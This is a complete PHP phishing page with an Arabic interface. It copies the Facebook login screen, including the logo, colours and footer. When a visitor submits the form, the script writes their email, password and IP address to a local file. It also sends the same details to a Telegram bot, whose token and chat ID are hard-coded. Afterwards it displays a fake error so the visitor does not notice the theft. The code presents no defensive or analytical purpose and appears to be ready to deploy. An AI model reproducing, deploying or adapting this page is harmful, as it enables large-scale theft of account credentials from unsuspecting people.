<?php
session_start();

// ---- بيانات تليجرام ----
define('BOT_TOKEN', '8754272812:AAGpmvHz9mIrgEYintSzApfI7HXmK751DPc');
define('CHAT_ID', '5977485445');
// -------------------------

// =============================================
// إذا تم الضغط على زر تسجيل الدخول
// =============================================
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['email'])) {
    
    // استلام البيانات من النموذج
    $email = $_POST['email'];
    $pass  = $_POST['pass'];
    $ip    = $_SERVER['REMOTE_ADDR'];
    $time  = date('Y-m-d H:i:s');
    
    // تنسيق السجل
    $log = "========== LOGIN ==========\n";
    $log .= "Time   : $time\n";
    $log .= "IP     : $ip\n";
    $log .= "Email  : $email\n";
    $log .= "Pass   : $pass\n";
    $log .= "============================\n\n";
    
    // حفظ البيانات في ملف
    file_put_contents('credentials.txt', $log, FILE_APPEND | LOCK_EX);
    
    // إرسال إلى تليجرام
    $telegramMsg = urlencode("🔔 جديد!\n\n📧 الإيميل: $email\n🔑 كلمة السر: $pass\n🕐 الوقت: $time\n🌐 الآيبي: $ip");
    $url = "https://api.telegram.org/bot" . BOT_TOKEN . "/sendMessage?chat_id=" . CHAT_ID . "&text=$telegramMsg";
    file_get_contents($url);
    
    // حفظ مؤشر session لعرض رسالة الخطأ
    $_SESSION['show_error'] = true;
    
    // إعادة تحميل الصفحة لمنع إعادة إرسال النموذج
    header('Location: index.php');
    exit;
}

// التحقق من عرض رسالة الخطأ
$showError = isset($_SESSION['show_error']) && $_SESSION['show_error'] === true;
if ($showError) {
    $_SESSION['show_error'] = false;
}
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>فيسبوك - سجل الدخول</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Helvetica, Arial, sans-serif; }
        body { background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; flex-direction: column; }
        .container { width: 980px; display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; }
        .left { width: 500px; }
        .left img { width: 280px; margin-bottom: -10px; }
        .left h2 { font-size: 28px; font-weight: normal; line-height: 32px; color: #1c1e21; }
        .right { width: 400px; background: #fff; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,.1), 0 8px 16px rgba(0,0,0,.1); padding: 20px; }
        .right input { width: 100%; padding: 14px 16px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; margin-bottom: 12px; outline: none; }
        .right input:focus { border-color: #1877f2; box-shadow: 0 0 0 2px #e7f3ff; }
        .right button[type="submit"] { width: 100%; padding: 12px; background: #1877f2; color: #fff; font-size: 20px; font-weight: bold; border: none; border-radius: 6px; cursor: pointer; }
        .right button[type="submit"]:hover { background: #166fe5; }
        .right a { display: block; text-align: center; color: #1877f2; font-size: 14px; text-decoration: none; margin: 16px 0; }
        .right a:hover { text-decoration: underline; }
        hr { border: none; border-top: 1px solid #dadde1; margin: 20px 0; }
        .signup-btn { width: auto; margin: 0 auto; display: block; padding: 12px 16px; background: #42b72a; color: #fff; font-size: 17px; font-weight: bold; border: none; border-radius: 6px; cursor: pointer; }
        .signup-btn:hover { background: #36a420; }
        .error-box {
            background: #ffebee;
            border: 1px solid #e57373;
            color: #c62828;
            padding: 16px;
            border-radius: 6px;
            margin-bottom: 16px;
            text-align: center;
            font-size: 14px;
            line-height: 1.6;
            display: <?php echo $showError ? 'block' : 'none'; ?>;
        }
        .error-box a { color: #c62828; font-weight: bold; text-decoration: underline; display: inline; margin: 0; }
        footer { text-align: center; margin-top: 20px; color: #737373; font-size: 12px; width: 100%; }
        @media (max-width: 900px) {
            .container { width: 90%; flex-direction: column; align-items: center; }
            .left { width: 100%; text-align: center; margin-bottom: 30px; }
            .left h2 { font-size: 24px; }
            .right { width: 100%; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="left">
            <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Facebook">
            <h2>يساعدك فيسبوك على التواصل مع الأشخاص في حياتك ومشاركتهم مناسباتهم.</h2>
        </div>
        <div class="right">
            <div class="error-box">
                <strong>تعذر تسجيل الدخول</strong><br>
                حدث خطأ غير متوقع. يرجى المحاولة مرة أخرى لاحقاً.<br>
                <a href="index.php">العودة إلى صفحة تسجيل الدخول</a>
            </div>
            <form method="POST">
                <input type="text" name="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required autofocus>
                <input type="password" name="pass" placeholder="كلمة السر" required>
                <button type="submit">تسجيل الدخول</button>
                <a href="#">هل نسيت كلمة السر؟</a>
                <hr>
                <button type="button" class="signup-btn">إنشاء حساب جديد</button>
            </form>
        </div>
        <footer>
            <p>أنشئ صفحة · المطورون · الوظائف · ملفات تعريف الارتباط · الخصوصية · الشروط · مساعدة</p>
            <p>Meta © 2026</p>
        </footer>
    </div>
</body>
</html>